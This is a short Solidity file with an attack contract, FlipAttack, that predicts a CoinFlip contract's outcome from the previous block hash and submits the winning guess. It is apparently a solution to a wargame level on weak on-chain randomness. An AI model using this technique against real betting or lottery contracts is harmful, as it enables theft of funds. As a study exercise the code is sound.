pragma solidity ^0.4.17;

contract FlipAttack {
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip _coinFlip;
    
    constructor(address coinFlipAddress) public {
        _coinFlip = CoinFlip(coinFlipAddress);
    }
    
    function attackCoinFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        _coinFlip.flip(side);
    }
    
}

contract CoinFlip{
  function flip(bool _guess) public returns (bool) {}
}
